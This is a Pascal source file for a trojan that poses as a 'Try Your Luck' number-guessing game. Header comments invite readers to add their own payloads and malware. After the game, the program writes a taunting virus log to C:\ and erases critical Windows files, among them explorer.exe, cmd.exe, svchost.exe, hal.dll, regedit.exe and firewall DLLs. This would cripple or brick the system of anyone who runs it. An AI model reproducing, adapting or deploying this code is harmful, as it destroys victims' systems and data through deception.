//You have to compile this on an identical machine to the machine to be used on.
//You can edit it to suit your purposes
//you can also edit it to add your own files,exploit,payloads,malwares,etc to specific locations in the windows file system
//you can edit the code to suit a linux machine. The code was written on a linux machine before i converted it to a win prog.
 
//Author = McZlatan Bourne
//Email = bournethesonofthegun@gmail.com
//================================================================================================================================
 

program
    Game_Embedded_Virus;
 
uses
    crt;
   
var
    i,number:LongInt;
    outfile:text;
    doc:array[1..15] of text;
   
begin
    clrscr;
   
    textcolor(cyan);
            textcolor(cyan);
        writeln(' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln('|                                                           |');
        writeln('|         T R Y   Y O U R     L U C K    G A M E            |');
        writeln('|                                                           |');
        writeln('| HINT: Number is an integer between -999,999 and +999,999  |');
        writeln('|                                                           |');
        writeln('|                                                           |');
        writeln(' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
 
    textcolor(white);
            begin
                delay(700);
                    writeln('Guess the Integer number in the database right now: ');
                    readln(number);
   
    Randomize;
    i := Random(999999);
   
    textcolor(red);
            begin
                if (number > 999999) then
                    writeln('Invalid Number Supplied')
                    else
                    if (number < -999999) then
                    writeln('Invalid Number Supplied');
       
            end;
    begin
        if (number <> i) then
            writeln('Bad Luck Follows You!!!')
                else if (number = i) then
    textcolor(green);
        writeln('Congratulations...Seems you are not a Bastard after all');    
    end;
    textcolor(green);
                writeln('The Number in the database is ',i);
            end;
 
   
    {Start of Virus Notification Alert from Program}
    assign(outfile, 'c:\Virus_Log.txt');
    rewrite(outfile);
   
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Creating Virus...');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Building Modular Components...');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Virus Created');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Installing Virus...');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, '10% 25% 30% 45% 50% 60% 70% 81% 90% 99% 100%...');
        writeln(outfile, '90% 99% 100%...');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Virus Installed!!!');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Disabling Anti-Virus...');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Anti-Virus Disabled!!!');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Locating Files...');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Log files located');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'DLL files located');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'BIN files located');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'EXE files located');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'DAT files located');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'CPL files located');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Scanning through located files');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Vulnerable files found');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting explorer.exe');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting notepad.exe');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting msconfig.exe');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting ipconfig.exe');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting svchost.exe');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting regedit.exe');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting cmd.exe');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting dsound.dll');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting FirewallAPI.dll');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting FirewallControlPanel.dll');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting filemgmt.dll');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting hal.dll');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting mib.bin');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'ATTACK SUCCESSFUL!!!');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Deleting Operation Log Files');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Removing Traces of attack');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Creating Signature on P.C...');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'Signature Created at c:\Virus_Log.txt');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
        writeln(outfile, 'All Done...');
        writeln(outfile, '- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -');
   
    close(outfile);
    {End of Virus Noitification from program}
   
    { Virus Action Begins }
            assign(doc[1],'c:\Windows\explorer.exe');
            erase(doc[1]);
       
            assign(doc[2],'c:\Windows\notepad.exe');
            erase(doc[2]);
           
            assign(doc[3],'c:\Windows\regedit.exe');
            erase(doc[3]);
           
            assign(doc[4],'c:\Windows\mib.bin');
            erase(doc[4]);
   
            assign(doc[5],'c:\Windows\bootstat.dat');
            erase(doc[5]);
   
            assign(doc[6],'c:\Windows\System32\cmd.exe');
            erase(doc[6]);
   
            assign(doc[7],'c:\Windows\explorer.exe');
            erase(doc[7]);
   
            assign(doc[8],'c:\Windows\System32\dsound.dll');
            erase(doc[8]);
           
            assign(doc[9],'c:\Windows\System32\FirewallAPI.dll');
            erase(doc[9]);
   
            assign(doc[10],'c:\Windows\System32\FirewallControlPanel.dll');
            erase(doc[10]);
   
            assign(doc[11],'c:\Windows\System32\filemgmt.dll');
            erase(doc[11]);
   
            assign(doc[12],'c:\Windows\System32\hal.dll');
            erase(doc[12]);
   
            assign(doc[13],'c:\Windows\System32\ipconfig.exe');
            erase(doc[13]);
   
            assign(doc[14],'c:\Windows\System32\msconfig.exe');
            erase(doc[14]);
   
            assign(doc[15],'c:\Windows\System32\svchost.exe');
            erase(doc[15]);
   
    {Virus action ends here}
        textcolor(cyan);
            writeln('Press the "Space Bar" Key to quit');
        while not keypressed do
end.
